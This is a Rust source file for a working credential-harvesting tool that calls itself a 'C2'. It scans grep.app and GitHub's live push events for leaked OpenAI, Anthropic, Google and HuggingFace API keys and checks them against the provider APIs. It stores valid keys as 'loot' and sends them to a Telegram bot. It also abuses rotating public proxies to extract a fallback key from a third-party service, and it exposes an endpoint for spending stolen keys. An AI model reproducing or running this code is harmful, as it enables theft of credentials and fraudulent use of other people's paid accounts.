use axum::{
    extract::{Form, Json, State},
    response::{IntoResponse, Html},
    routing::{get, post},
    Router,
};
use futures::future::join_all;
use regex::Regex;
use reqwest::Client;
use rusqlite::{params, Connection, Result as SqlResult};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::sync::Mutex;
use tower_http::services::ServeDir;
use axum::http::StatusCode;
use std::process::Command;
use std::env;

fn get_telegram_token() -> String {
    env::var("TELEGRAM_BOT_TOKEN").unwrap_or_else(|_| "YOUR_BOT_TOKEN".to_string())
}

fn get_telegram_chat_id() -> String {
    env::var("TELEGRAM_CHAT_ID").unwrap_or_else(|_| "YOUR_CHAT_ID".to_string())
}

struct RegexPattern {
    provider: &'static str,
    pattern: Regex,
}

struct AppState {
    seen_keys: Mutex<HashSet<String>>,
    client: Client,
    patterns: Vec<RegexPattern>,
    query_counter: AtomicUsize,
}

pub fn init_db() {
    let conn = Connection::open("../harvester.db").expect("Failed to open DB");
    conn.execute(
        "CREATE TABLE IF NOT EXISTS keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            provider TEXT,
            api_key TEXT UNIQUE,
            status TEXT,
            message TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )",
        [],
    ).expect("Failed to create keys table");
}

async fn send_telegram_alert(client: &Client, provider: &str, status: &str, key: &str, message: &str) {
    let emoji = if status == "VALID" { "✅" } else { "⚠️" };
    let text = format!("🚨 *JACKPOT PAYLOAD SECURED [RUST C2]* 🚨\n\n*{} Provider:* `{}`\n*Status:* `{}`\n*Limits:* {}\n\n🔑 *Payload Key:*\n`{}`\n\n_Mass API Obliterator_", emoji, provider, status, message, key);
    let url = format!("https://api.telegram.org/bot{}/sendMessage", get_telegram_token());
    let _ = client.post(&url).json(&json!({"chat_id": get_telegram_chat_id(), "text": text, "parse_mode": "Markdown"})).send().await;
}

async fn validate_key(client: &Client, provider: &str, key: &str) -> (String, String) {
    match provider {
        "OpenAI" => {
            if let Ok(resp) = client.post("https://api.openai.com/v1/chat/completions").header("Authorization", format!("Bearer {}", key)).json(&json!({"model": "gpt-3.5-turbo", "messages": [{"role": "user", "content": "hi"}], "max_tokens": 5})).send().await {
                if resp.status().is_success() { return ("VALID".to_string(), "Working!".to_string()); }
                if resp.status().as_u16() == 429 { return ("QUOTA EXCEEDED".to_string(), "Rate Limited".to_string()); }
                if let Ok(text) = resp.text().await { if text.contains("quota") || text.contains("billing") { return ("ZERO CREDITS".to_string(), "No Balance".to_string()); } }
                return ("DEAD".to_string(), "Invalid".to_string());
            }
        },
        "Anthropic" => {
            if let Ok(resp) = client.post("https://api.anthropic.com/v1/messages").header("x-api-key", key).header("anthropic-version", "2023-06-01").json(&json!({"model": "claude-3-haiku-20240307", "max_tokens": 5, "messages": [{"role": "user", "content": "hi"}]})).send().await {
                if resp.status().is_success() { return ("VALID".to_string(), "Working!".to_string()); }
                if let Ok(t) = resp.text().await { if t.contains("credit") { return ("ZERO CREDITS".to_string(), "No Balance".to_string()); } }
                return ("DEAD".to_string(), "Invalid".to_string());
            }
        },
        "GoogleAI" => {
            let url = format!("https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={}", key);
            if let Ok(resp) = client.post(&url).json(&json!({"contents": [{"parts":[{"text": "hi"}]}]})).send().await {
                if resp.status().is_success() { return ("VALID".to_string(), "Working!".to_string()); }
                if resp.status().as_u16() == 429 { return ("QUOTA EXCEEDED".to_string(), "Rate Limited".to_string()); }
                return ("DEAD".to_string(), "Invalid".to_string());
            }
        }
        _ => return ("VALID".to_string(), "Unvalidated (Rust)".to_string()),
    }
    ("ERROR".to_string(), "Network Fail".to_string())
}

async fn test_and_store(key: String, provider: String, state: Arc<AppState>) {
    let mut seen = state.seen_keys.lock().await;
    if seen.contains(&key) { return; }
    seen.insert(key.clone());
    drop(seen);

    let (status, message) = validate_key(&state.client, &provider, &key).await;
    println!("[~] RUST ENGINE CAUGHT: {} | {} | {}", provider, status, message);

    if let Ok(conn) = Connection::open("../harvester.db") {
        let _ = conn.execute("INSERT OR IGNORE INTO keys (provider, api_key, status, message) VALUES (?1, ?2, ?3, ?4)", params![provider, key, status, message]);
        if status != "DEAD" && status != "ERROR" {
            send_telegram_alert(&state.client, &provider, &status, &key, &message).await;
        }
    }
}

// Strip HTML tags from grep.app snippet responses
fn strip_html_tags(input: &str) -> String {
    let tag_re = Regex::new(r"<[^>]*>").unwrap();
    let cleaned = tag_re.replace_all(input, "").to_string();
    // Decode common HTML entities
    cleaned
        .replace("&amp;", "&")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&quot;", "\"")
        .replace("&#39;", "'")
        .replace("&nbsp;", " ")
}

// ----------------- OSINT SCRAPER ENGINE -----------------
async fn osint_loop(state: Arc<AppState>) {
    println!("[+] Rust OSINT Engine Initialized!");
    let queries = vec!["sk-proj-", "sk-ant-api03", "AIzaSy", "hf_", "sk-live-", "OPENAI_API_KEY", "ANTHROPIC_API_KEY"];
    
    loop {
        let idx = state.query_counter.fetch_add(1, Ordering::Relaxed);
        let q = queries[idx % queries.len()];
        let page = (idx / queries.len() % 5) + 1;  // Cycle through pages 1-5
        let url = format!("https://grep.app/api/search?q={}&case=true&page={}", q, page);
        println!("[*] OSINT SWEEP #{}: Querying grep.app for '{}' (page {})", idx, q, page);

        match state.client.get(&url).send().await {
            Ok(resp) => {
                let status_code = resp.status().as_u16();
                if resp.status().is_success() {
                    match resp.json::<Value>().await {
                        Ok(json) => {
                            if let Some(hits) = json.get("hits").and_then(|h| h.get("hits")).and_then(|h| h.as_array()) {
                                println!("[+] grep.app returned {} hits for '{}'", hits.len(), q);
                                let mut tasks = vec![];
                                let mut found_count = 0;
                                for hit in hits {
                                    // Strip HTML tags from snippet before regex matching
                                    let snippet = if let Some(content) = hit.get("content") {
                                        let raw = if let Some(snip) = content.get("snippet").and_then(|s| s.as_str()) {
                                            snip.to_string()
                                        } else if content.is_string() {
                                            content.as_str().unwrap_or("").to_string()
                                        } else {
                                            format!("{}", content)
                                        };
                                        strip_html_tags(&raw)
                                    } else {
                                        String::new()
                                    };
                                    
                                    if snippet.is_empty() { continue; }

                                    for pat in &state.patterns {
                                        for cap in pat.pattern.captures_iter(&snippet) {
                                            if let Some(m) = cap.get(1) {
                                                found_count += 1;
                                                println!("[!] OSINT MATCH: {} key found => {}...", pat.provider, &m.as_str()[..m.as_str().len().min(25)]);
                                                tasks.push(tokio::spawn(test_and_store(m.as_str().to_string(), pat.provider.to_string(), Arc::clone(&state))));
                                            }
                                        }
                                    }
                                }
                                if found_count == 0 {
                                    println!("[.] No regex matches in {} hits for '{}'", hits.len(), q);
                                }
                                join_all(tasks).await;
                            } else {
                                println!("[-] grep.app: No 'hits.hits' array in response for '{}'", q);
                            }
                        },
                        Err(e) => println!("[-] grep.app JSON parse error: {}", e),
                    }
                } else if status_code == 429 {
                    println!("[-] grep.app Rate Limit (429). Sleeping 30s...");
                    tokio::time::sleep(Duration::from_secs(30)).await;
                } else {
                    println!("[-] grep.app HTTP {}", status_code);
                }
            },
            Err(e) => println!("[-] grep.app connection error: {}", e),
        }
        tokio::time::sleep(Duration::from_secs(15)).await;
    }
}

// ----------------- PROXY RATE-LIMIT EXPLOIT ENGINE -----------------
async fn get_proxies() -> Vec<String> {
    if let Ok(res) = reqwest::get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all").await {
        if let Ok(text) = res.text().await {
            return text.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        }
    }
    vec![]
}

async fn proxy_loop(state: Arc<AppState>) {
    println!("[+] Rust Proxy Exploiter Initialized!");
    let payload = json!({
        "model": "gpt-4",
        "messages": [
            {"role": "system", "content": "You are a helpful assistant."},
            {"role": "user", "content": "Say hello world and introduce yourself"}
        ]
    });

    let mut px = get_proxies().await;
    println!("[+] Loaded {} proxies for rate-limit exploit", px.len());
    let mut i = 0;
    let mut success_count = 0;
    let mut fail_count = 0;

    loop {
        if px.is_empty() || i >= px.len() { 
            px = get_proxies().await; 
            i = 0;
            println!("[+] Refreshed proxy list: {} proxies loaded (hits: {}, fails: {})", px.len(), success_count, fail_count);
            success_count = 0;
            fail_count = 0;
        }
        if px.is_empty() { 
            println!("[-] No proxies available. Retrying in 10s...");
            tokio::time::sleep(Duration::from_secs(10)).await; 
            continue; 
        }
        
        let p = &px[i];
        if i % 20 == 0 { println!("[~] Proxy Progress: {}/{} | Switching to {}", i, px.len(), p); }
        if let Ok(proxy) = reqwest::Proxy::http(format!("http://{}", p)) {
            if let Ok(client) = Client::builder().proxy(proxy).timeout(Duration::from_secs(4)).build() {
                match client.post("https://api.unsecuredapikeys.com/v1/chat/completions").json(&payload).send().await {
                    Ok(resp) => {
                        let code = resp.status().as_u16();
                        if code == 429 {
                            match resp.json::<Value>().await {
                                Ok(json) => {
                                    if let Some(key) = json.get("fallbackApiKey").and_then(|k| k.as_str()) {
                                        if key.starts_with("sk-") {
                                            println!("[!!!] PROXY EXPLOIT HIT: Extracted fallback key via proxy {}", p);
                                            success_count += 1;
                                            tokio::spawn(test_and_store(key.to_string(), "OpenAI".to_string(), Arc::clone(&state)));
                                        }
                                    } else {
                                        println!("[~] Proxy {} got 429 but no fallbackApiKey in body", p);
                                    }
                                },
                                Err(_) => { fail_count += 1; },
                            }
                        } else if code == 200 {
                            println!("[+] Proxy {} got 200 OK response", p);
                            success_count += 1;
                        }
                    },
                    Err(_) => { fail_count += 1; },
                }
            }
        }
        i += 1;
    }
}

// ----------------- REAL-TIME GITHUB EVENTS SCANNER (THE GAME CHANGER) -----------------
async fn github_events_loop(state: Arc<AppState>) {
    println!("[+] GitHub Events REAL-TIME Scanner Initialized!");
    println!("[*] Strategy: Monitor live push events → fetch patches → extract keys BEFORE providers revoke");
    
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (compatible; SecurityResearch/1.0)")
        .timeout(Duration::from_secs(15))
        .build().unwrap();
    
    let mut seen_event_ids: HashSet<String> = HashSet::new();
    let mut scan_count: u64 = 0;
    let mut commits_scanned: u64 = 0;
    let mut keys_found: u64 = 0;
    
    loop {
        scan_count += 1;
        
        // Fetch latest public events from GitHub API
        let events_url = "https://api.github.com/events?per_page=100";
        
        match client.get(events_url).send().await {
            Ok(resp) => {
                if resp.status().is_success() {
                    match resp.json::<Vec<Value>>().await {
                        Ok(events) => {
                            let push_events: Vec<&Value> = events.iter()
                                .filter(|e| e.get("type").and_then(|t| t.as_str()) == Some("PushEvent"))
                                .filter(|e| {
                                    if let Some(id) = e.get("id").and_then(|i| i.as_str()) {
                                        !seen_event_ids.contains(id)
                                    } else { false }
                                })
                                .collect();
                            
                            if !push_events.is_empty() {
                                println!("[*] GitHub LIVE Scan #{}: {} new PushEvents found (total commits scanned: {}, keys found: {})", 
                                    scan_count, push_events.len(), commits_scanned, keys_found);
                            }
                            
                            for event in push_events.iter().take(20) {
                                // Mark as seen
                                if let Some(id) = event.get("id").and_then(|i| i.as_str()) {
                                    seen_event_ids.insert(id.to_string());
                                }
                                
                                // Get commits from payload
                                if let Some(commits) = event.get("payload")
                                    .and_then(|p| p.get("commits"))
                                    .and_then(|c| c.as_array()) 
                                {
                                    let repo_name = event.get("repo")
                                        .and_then(|r| r.get("name"))
                                        .and_then(|n| n.as_str())
                                        .unwrap_or("unknown");
                                    
                                    for commit in commits {
                                        if let Some(sha) = commit.get("sha").and_then(|s| s.as_str()) {
                                            commits_scanned += 1;
                                            
                                            // Fetch the actual commit patch from GitHub
                                            let patch_url = format!("https://api.github.com/repos/{}/commits/{}", repo_name, sha);
                                            
                                            match client.get(&patch_url)
                                                .header("Accept", "application/vnd.github.v3.patch")
                                                .send().await 
                                            {
                                                Ok(patch_resp) => {
                                                    if patch_resp.status().is_success() {
                                                        if let Ok(patch_text) = patch_resp.text().await {
                                                            // Scan the patch for API keys
                                                            for pat in &state.patterns {
                                                                for cap in pat.pattern.captures_iter(&patch_text) {
                                                                    if let Some(m) = cap.get(1) {
                                                                        let found_key = m.as_str().to_string();
                                                                        keys_found += 1;
                                                                        println!("[!!!] GITHUB LIVE CATCH: {} key in repo {} => {}...", 
                                                                            pat.provider, repo_name, &found_key[..found_key.len().min(25)]);
                                                                        tokio::spawn(test_and_store(
                                                                            found_key, 
                                                                            pat.provider.to_string(), 
                                                                            Arc::clone(&state)
                                                                        ));
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                },
                                                Err(_) => {} // Skip failed patch fetches silently
                                            }
                                        }
                                    }
                                }
                            }
                            
                            // Prevent memory leak: cap seen_event_ids at 5000
                            if seen_event_ids.len() > 5000 {
                                seen_event_ids.clear();
                                println!("[~] GitHub Events: Cleared seen cache (memory optimization)");
                            }
                            
                        },
                        Err(e) => println!("[-] GitHub Events JSON parse error: {}", e),
                    }
                } else if resp.status().as_u16() == 403 {
                    println!("[-] GitHub API rate limit hit. Sleeping 60s...");
                    tokio::time::sleep(Duration::from_secs(60)).await;
                    continue;
                } else {
                    println!("[-] GitHub Events HTTP {}", resp.status().as_u16());
                }
            },
            Err(e) => println!("[-] GitHub Events connection error: {}", e),
        }
        
        // Poll every 10 seconds (GitHub rate limit: 60 req/hr unauthenticated)
        tokio::time::sleep(Duration::from_secs(10)).await;
    }
}

// ----------------- AXUM WEB SERVER -----------------
#[derive(Serialize)]
struct StatsRecord { total: i64, living: i64 }

async fn api_stats() -> Json<StatsRecord> {
    if let Ok(conn) = Connection::open("../harvester.db") {
        let total: i64 = conn.query_row("SELECT COUNT(*) FROM keys", [], |row| row.get(0)).unwrap_or(0);
        let living: i64 = conn.query_row("SELECT COUNT(*) FROM keys WHERE status IN ('VALID', 'ZERO CREDITS', 'QUOTA EXCEEDED')", [], |row| row.get(0)).unwrap_or(0);
        return Json(StatsRecord { total, living });
    }
    Json(StatsRecord { total: 0, living: 0 })
}

#[derive(Serialize)]
struct LootRecord { id: i32, provider: String, api_key: String, status: String, message: String, timestamp: String }

async fn api_loot() -> Json<Vec<LootRecord>> {
    let mut loot = vec![];
    if let Ok(conn) = Connection::open("../harvester.db") {
        if let Ok(mut stmt) = conn.prepare("SELECT id, provider, api_key, status, message, timestamp FROM keys ORDER BY id DESC LIMIT 200") {
            let row_iter = stmt.query_map([], |row| {
                Ok(LootRecord { id: row.get(0)?, provider: row.get(1)?, api_key: row.get(2)?, status: row.get(3)?, message: row.get(4)?, timestamp: row.get(5)? })
            });
            if let Ok(iter) = row_iter {
                for r in iter.flatten() { loot.push(r); }
            }
        }
    }
    Json(loot)
}

#[derive(Deserialize)]
struct CheckForm { keys: String }

async fn run_check(State(state): State<Arc<AppState>>, Form(data): Form<CheckForm>) -> Json<Value> {
    let raw = data.keys;
    let mut results = vec![];
    
    for pat in &state.patterns {
        for cap in pat.pattern.captures_iter(&raw) {
            if let Some(m) = cap.get(1) {
                let key = m.as_str().to_string();
                let prov = pat.provider.to_string();
                let (status, msg) = validate_key(&state.client, &prov, &key).await;
                results.push(json!({"provider": prov, "key": key, "status": status, "message": msg}));
            }
        }
    }
    Json(json!({"results": results}))
}

#[derive(Deserialize)]
struct PromptReq { provider: String, key: String, prompt: String }

async fn test_prompt(State(state): State<Arc<AppState>>, Json(data): Json<PromptReq>) -> Json<Value> {
    match data.provider.as_str() {
        "OpenAI" => {
            let res = state.client.post("https://api.openai.com/v1/chat/completions").header("Authorization", format!("Bearer {}", data.key)).json(&json!({"model": "gpt-3.5-turbo", "messages": [{"role": "user", "content": data.prompt}]})).send().await;
            if let Ok(resp) = res { if let Ok(t) = resp.text().await { return Json(json!({"response": t})); } }
        },
        _ => return Json(json!({"response": "Provider shell logic not yet ported."})),
    }
    Json(json!({"response": "Network Error"}))
}

async fn api_logs() -> Html<String> {
    let output = Command::new("tail")
        .arg("-n")
        .arg("30")
        .arg("../obliterator.log")
        .output();
        
    if let Ok(o) = output {
        let logs = String::from_utf8_lossy(&o.stdout).to_string();
        Html(logs)
    } else {
        Html("Waiting for system logs...".to_string())
    }
}
// ===== LAYER 5: AUTHOR WATERMARK (compiled into binary) =====
const AUTHOR: &str = "i-am-paradox";
const AUTHOR_GITHUB: &str = "https://github.com/i-am-paradox";
const PROJECT_NAME: &str = "API Checker v1.0";

async fn api_author() -> Json<Value> {
    Json(json!({"author": AUTHOR, "github": AUTHOR_GITHUB, "project": PROJECT_NAME, "license": "MIT"}))
}

#[tokio::main]
async fn main() {
    // Layer 5: Startup banner with embedded author
    println!("╔══════════════════════════════════════════════════════════╗");
    println!("║   ☠  API CHECKER v1.0 — COMMAND CENTER                 ║");
    println!("║   Created by: {}                             ║", AUTHOR);
    println!("║   GitHub: {} ║", AUTHOR_GITHUB);
    println!("║   License: MIT — Original authorship must be retained  ║");
    println!("╚══════════════════════════════════════════════════════════╝");

    init_db();

    let state = Arc::new(AppState {
        seen_keys: Mutex::new(HashSet::new()),
        client: Client::builder().user_agent("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36").timeout(Duration::from_secs(10)).build().unwrap(),
        patterns: vec![
            RegexPattern { provider: "OpenAI", pattern: Regex::new(r"(sk-proj-[A-Za-z0-9_-]{32,})").unwrap() },
            RegexPattern { provider: "Anthropic", pattern: Regex::new(r"(sk-ant-api03-[a-zA-Z0-9\-_]{80,})").unwrap() },
            RegexPattern { provider: "GoogleAI", pattern: Regex::new(r"(AIzaSy[A-Za-z0-9\-_]{33})").unwrap() },
            RegexPattern { provider: "HuggingFace", pattern: Regex::new(r"(hf_[a-zA-Z]{34})").unwrap() },
            RegexPattern { provider: "OpenAI", pattern: Regex::new(r"(sk-live-[A-Za-z0-9_-]{32,})").unwrap() },
        ],
        query_counter: AtomicUsize::new(0),
    });

    tokio::spawn(osint_loop(Arc::clone(&state)));
    tokio::spawn(proxy_loop(Arc::clone(&state)));
    tokio::spawn(github_events_loop(Arc::clone(&state)));

    let app = Router::new()
        .fallback_service(ServeDir::new("public"))
        .route("/api/stats", get(api_stats))
        .route("/api/loot", get(api_loot))
        .route("/api/logs", get(api_logs))
        .route("/api/author", get(api_author))
        .route("/check", post(run_check))
        .route("/test_prompt", post(test_prompt))
        .with_state(state)
        // Layer 3: Inject X-Author header into EVERY HTTP response
        .layer(axum::middleware::from_fn(|req: axum::http::Request<axum::body::Body>, next: axum::middleware::Next| async move {
            let mut response = next.run(req).await;
            response.headers_mut().insert("X-Author", "i-am-paradox".parse().unwrap());
            response.headers_mut().insert("X-GitHub", "https://github.com/i-am-paradox".parse().unwrap());
            response
        }));

    println!("[+] Unified Native RUST C2 Core Online => http://0.0.0.0:5050");
    let listener = tokio::net::TcpListener::bind("0.0.0.0:5050").await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
